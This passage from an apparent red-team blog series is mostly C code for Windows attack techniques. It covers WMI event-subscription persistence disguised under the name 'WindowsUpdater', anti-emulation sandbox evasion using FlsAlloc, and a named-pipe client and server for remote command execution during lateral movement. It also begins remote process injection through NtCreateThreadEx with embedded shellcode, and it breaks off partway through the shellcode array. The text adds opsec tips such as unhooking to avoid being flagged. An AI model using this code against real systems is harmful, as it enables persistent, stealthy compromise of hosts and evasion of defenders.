    <span class="n">hres</span><span class="o">=</span><span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">GetObject</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span><span class="n">consumerclass</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pConsumer</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CommandLineEventConsumer class was not properly connected "</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
       <span class="n">printf</span><span class="p">(</span><span class="s">"CommandLineEventConsumer class was properly connected</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//13.Spawning CommandLineEventConsumer Class</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pConsumer</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">SpawnInstance</span><span class="p">(</span><span class="n">pConsumer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pConsumerInstance</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Consumer class instance wasn't properly spawned</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Consumer class instance was properly spawned</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//14.Setting CommandLineEventConsumer Class Name Field</span>

    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"WindowsUpdater"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">ConsumerName</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"Name"</span><span class="p">);</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pConsumerInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pConsumerInstance</span><span class="p">,</span><span class="n">ConsumerName</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>

    <span class="c1">//15.Setting CommandLineEventConsumer Class RunInteractively Field</span>

    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"false"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">ConsumerRunI</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"RunInteractively"</span><span class="p">);</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pConsumerInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pConsumerInstance</span><span class="p">,</span><span class="n">ConsumerRunI</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>


    <span class="c1">//16.Setting CommandLineEventConsumer Class CommandLineTemplate Field</span>

    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="c1">//PUT YOUR COMMAND IN THIS LINE</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"cmd /C echo Success &gt;&gt; C:</span><span class="se">\\</span><span class="s">test.txt"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">ConsumerCommand</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"CommandLineTemplate"</span><span class="p">);</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pConsumerInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pConsumerInstance</span><span class="p">,</span><span class="n">ConsumerCommand</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>


    <span class="n">hres</span><span class="o">=</span><span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">PutInstance</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span><span class="n">pConsumerInstance</span><span class="p">,</span><span class="n">WBEM_FLAG_CREATE_OR_UPDATE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Modified Event CommandLineEventConsumer Instance was unable to be written</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CommandLineEventConsumer class instance was properly written</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="p">}</span>


    <span class="c1">//17.Getting __FiltertoConsumerBinding Class</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">GetObject</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span><span class="n">binderclass</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pBinder</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"__FiltertoConsumerBinding class was not properly connected "</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
       <span class="n">printf</span><span class="p">(</span><span class="s">"__FilterToConsumerBinding class was properly connected</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//18.Spawning Binder Class</span>
     <span class="n">hres</span><span class="o">=</span><span class="n">pBinder</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">SpawnInstance</span><span class="p">(</span><span class="n">pBinder</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pBinderInstance</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"FilterToConsumerBinding class instance wasn't properly spawned</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"FilterToConsumerBinding class instance was properly spawned</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//19.Setting the EventFilter rel path</span>
     <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
     <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"__EventFilter.Name=</span><span class="se">\"</span><span class="s">WindowsUpdater</span><span class="se">\"</span><span class="s">"</span><span class="p">);;</span>

    <span class="n">BSTR</span> <span class="n">Filter</span> <span class="o">=</span> <span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"Filter"</span><span class="p">);</span>
    <span class="n">pBinderInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pBinderInstance</span><span class="p">,</span><span class="n">Filter</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>

    <span class="c1">//20.Setting the CommandLineEventConsumer rel path</span>
    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"CommandLineEventConsumer.Name=</span><span class="se">\"</span><span class="s">WindowsUpdater</span><span class="se">\"</span><span class="s">"</span><span class="p">);;</span>
    <span class="n">BSTR</span> <span class="n">Consumer</span> <span class="o">=</span> <span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"Consumer"</span><span class="p">);</span>
    <span class="n">pBinderInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pBinderInstance</span><span class="p">,</span><span class="n">Consumer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>
    <span class="c1">//21.Saving changes for Modified __FilterToConsumerBinding Instance</span>
    <span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">PutInstance</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span><span class="n">pBinderInstance</span><span class="p">,</span><span class="n">WBEM_FLAG_CREATE_OR_UPDATE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Modified FilterToConsumerBinding class instance wasn't properly written</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>

    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"FilterToConsumerBinding class instance was properly written</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//CLEANUP</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pFilterInstance</span><span class="p">){</span>
        <span class="n">pFilterInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pFilterInstance</span><span class="p">);</span>
        <span class="n">pFilterInstance</span> <span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pBinderInstance</span><span class="p">){</span>
        <span class="n">pBinderInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pBinderInstance</span><span class="p">);</span>
        <span class="n">pBinderInstance</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pConsumerInstance</span><span class="p">){</span>
        <span class="n">pConsumerInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pConsumerInstance</span><span class="p">);</span>
        <span class="n">pConsumerInstance</span> <span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pObject</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pObject</span><span class="p">);</span>
    <span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pServices</span><span class="p">);</span>
    <span class="n">CoUninitialize</span><span class="p">();</span>

<span class="n">cleanup</span><span class="o">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pConsumer</span><span class="p">){</span>
        <span class="n">pConsumer</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pConsumer</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pFilter</span><span class="p">){</span>
        <span class="n">pFilter</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pFilter</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pBinder</span><span class="p">){</span>
        <span class="n">pBinder</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pBinder</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pServices</span><span class="p">){</span>
        <span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pServices</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pObject</span><span class="p">){</span>
        <span class="n">pObject</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pObject</span><span class="p">);</span>
    <span class="p">}</span>



<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>


<span class="p">}</span>
</code></pre></div></div>

<p>ref: https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/</p>

<p>https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event</p>

<h2 id="day3">DAY3</h2>
<h2 id="windows-anti-emulation-tactics-by-abusing-non-emulated-api-calls">Windows Anti-Emulation Tactics by abusing Non-Emulated API calls</h2>

<p>While there are signature based AVs, in recent years there has been a
uprise in detection by emulation.Essentially putting a malicious program in a sandbox
to see what it might do and monitor its behavior. Due to this a lot of malware employ evasion techniques
to trick the emulator into letting it through. One such tactic employed is
using Non-Emulated Api calls to determine if the OS is legit or a sandbox.
Due to the complexity of the Windows API, sandboxes usually only employ
a select amount while emulating. An attacker can use one of the Api calls
not commonly checked for and based on if the function comes up valid or fails,can
make their malware goto sleep and not execute the malicious code path.Any WinApi can be used,                                  as long as it’s obscure enough to not be emulated by the sandbox.One such function
that could be used for this check is <strong>FsAlloc</strong>.</p>

<p>This function is used to allocate Fiber Local Storage Index, which is a space of memory where a fiber can store and retrieve local variables. If you want more information on fibers and ways you can implement them check out Day 1 of this series. Due to lack of use of fibers in a normal process, this function may not be supported by a sandbox, but will be supported by the Windows Operating System.</p>

<p>Code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
  <span class="n">DWORD</span> <span class="n">test</span> <span class="o">=</span> <span class="n">FlsAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="n">test</span> <span class="o">==</span> <span class="n">FLS_OUT_OF_INDEXES</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Going to Sleep"</span><span class="p">);</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"About to load up malicious code"</span><span class="p">);</span>

  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>ref:https://docs.microsoft.com/en-us/windows/win32/</p>

<h2 id="day4">DAY4</h2>
<h2 id="lateral-movement-with-named-pipes">Lateral Movement with Named Pipes</h2>

<p>When using named pipes which utilize the SMB protocol, you can establish a client,server connection between two endpoints. The server endpoint will be on your compromised host and the client will be on the machine your compromised user has access to in some way. A few known methods of doing this in the past, have been <strong><code class="highlighter-rouge">PsExec</code></strong> and Cobalt’s Strike implementation <strong><code class="highlighter-rouge">PsExec(psh)</code></strong>. The former achieved this by logging into the $ADMIN share and dropping a exe file, that established a named pipe connection to the compromised machine. The later achieved this by logging into the $ADMIN share, but instead of dropping an exe file it instead ran base64 encoded Powershell to establish a named pipe connection to the compromised machine. The Poc below is two exes, a server named pipe and a client named pipe. The scenario is that you have already connected to the $ADMIN share and dropped your client exe unto the machine, and it simply executes one command and writes it back through named pipe to your compromised machine.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Client</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="o">:</span> <span class="n">Usage</span><span class="o">:</span> <span class="n">clientnamedpipe</span><span class="p">.</span><span class="n">exe</span> <span class="p">[</span><span class="n">ip</span> <span class="n">here</span> <span class="n">where</span> <span class="n">server</span> <span class="n">endpoint</span> <span class="n">is</span> <span class="n">hosted</span> <span class="p">]</span> <span class="n">testpipe</span>
<span class="cp">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="cp">#define MAX_SIZE 1024
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

<span class="n">DWORD</span> <span class="n">dRead</span><span class="p">;</span>
<span class="n">CHAR</span> <span class="n">_RemoteNamedPipe</span><span class="o">=</span> <span class="p">(</span><span class="n">CHAR_</span><span class="p">)</span><span class="n">GlobalAlloc</span><span class="p">(</span><span class="n">GPTR</span><span class="p">,</span><span class="n">MAX_SIZE</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">dWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">command</span><span class="p">[</span><span class="n">MAX_SIZE</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">output</span><span class="p">[</span><span class="n">MAX_SIZE</span><span class="p">];</span>
<span class="n">snprintf</span><span class="p">(</span><span class="n">RemoteNamedPipe</span><span class="p">,</span><span class="n">MAX_SIZE</span><span class="p">,</span><span class="s">"</span><span class="se">\\\\</span><span class="s">%s</span><span class="se">\\</span><span class="s">pipe</span><span class="se">\\</span><span class="s">%s"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Connecting to %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">RemoteNamedPipe</span><span class="p">);</span>
<span class="n">HANDLE</span> <span class="n">hPipe</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">RemoteNamedPipe</span><span class="p">,</span><span class="n">GENERIC_READ</span><span class="o">|</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="n">FILE_SHARE_READ</span><span class="o">|</span><span class="n">FILE_SHARE_WRITE</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span>
                          <span class="n">OPEN_ALWAYS</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">hPipe</span><span class="p">);</span>
<span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="n">command</span><span class="p">,</span><span class="n">MAX_SIZE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dRead</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">command</span><span class="p">);</span>
<span class="kt">FILE</span> <span class="o">*</span><span class="n">pPipe</span><span class="o">=</span> <span class="n">_popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
<span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="n">MAX_SIZE</span><span class="p">,</span><span class="n">pPipe</span><span class="p">)){</span>
<span class="n">puts</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">output</span><span class="p">);</span>
<span class="n">WriteFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="n">output</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">output</span><span class="p">),</span><span class="o">&amp;</span><span class="n">dWritten</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>

<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pPipe</span><span class="p">);</span>
<span class="n">CloseHandle</span><span class="p">(</span><span class="n">RemoteNamedPipe</span><span class="p">);</span>
<span class="n">GlobalFree</span><span class="p">(</span><span class="n">RemoteNamedPipe</span><span class="p">);</span>

<span class="p">}</span>

</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Server</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="o">:</span> <span class="n">Usage</span><span class="o">:</span> <span class="n">servernamedpipe</span><span class="p">.</span><span class="n">exe</span> <span class="s">"whoami"</span>

<span class="cp">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#define MAX_SIZE 1024
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="n">DWORD</span> <span class="n">dwRead</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">dWrote</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">MAX_SIZE</span><span class="p">];</span>
<span class="n">HANDLE</span> <span class="n">hPipe</span><span class="o">=</span> <span class="n">CreateNamedPipeA</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">pipe</span><span class="se">\\</span><span class="s">testpipe"</span><span class="p">,</span><span class="n">PIPE_ACCESS_DUPLEX</span><span class="p">,</span><span class="n">PIPE_TYPE_BYTE</span><span class="o">|</span><span class="n">PIPE_READMODE_BYTE</span><span class="p">,</span>
                                <span class="n">PIPE_UNLIMITED_INSTANCES</span><span class="p">,</span><span class="n">MAX_SIZE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10000</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"hPipe 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">hPipe</span><span class="p">);</span>
<span class="n">ConnectNamedPipe</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">WriteFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="o">&amp;</span><span class="n">dWrote</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">MAX_SIZE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwRead</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"We received this amount of data %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwRead</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"This is the data %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="p">}</span>

<span class="n">DisconnectNamedPipe</span><span class="p">(</span><span class="n">hPipe</span><span class="p">);</span>
<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipe</span><span class="p">);</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>
<h5 id="day-5">DAY 5</h5>
<h2 id="remote-process-injection-via-ntcreatethreadex">Remote Process Injection via NtCreateThreadEx</h2>
<p>Remote Process Injection is a method for operators to migrate to active processes in order to blend in to the target and execute arbitrary code. There are plenty of ways to do this, however in this blogpost we’ll be using <strong><code class="highlighter-rouge">NtCreateThreadEx</code></strong> in order to start a new thread in the virtual address space of the remote process.<strong><code class="highlighter-rouge">NtCreateThreadEx</code></strong> is a undocumented Native API that resides in nt.dll which is the library where the Native API live. The more well known Windows API <strong><code class="highlighter-rouge">CreateRemoteThread</code></strong> actually calls this function behind the scenes before it enters the kernel. Still in order to use this technique in engagements  you may need to unhook this function in order to not have it get flagged.</p>

<h3 id="steps">Steps:</h3>

<p>1.Open Remote Process - OpenProcess()</p>

<p>2.Allocate Memory in the Remote Process with PAGE_EXECUTE_READWRITE permissions-VirtualAllocEx()</p>

<p>​      * Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec</p>

<p>3.Write shellcode over to the newly allocated memory space - WriteProcessMemory()</p>

<p>4.Start a New Thread pointing to the allocated memory space -NtCreateThreadEx()</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
#include &lt;winternl.h&gt;
</span>
<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="n">NtCreateThreadEx</span><span class="p">)(</span><span class="n">HANDLE</span> <span class="o">*</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span> <span class="n">pAttr</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span> <span class="n">pFunc</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span> <span class="n">pArg</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">ZeroBits</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">StackSize</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">MaxStackSize</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span> <span class="n">pAttrListOut</span><span class="p">);</span>



<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span class="s">"</span>
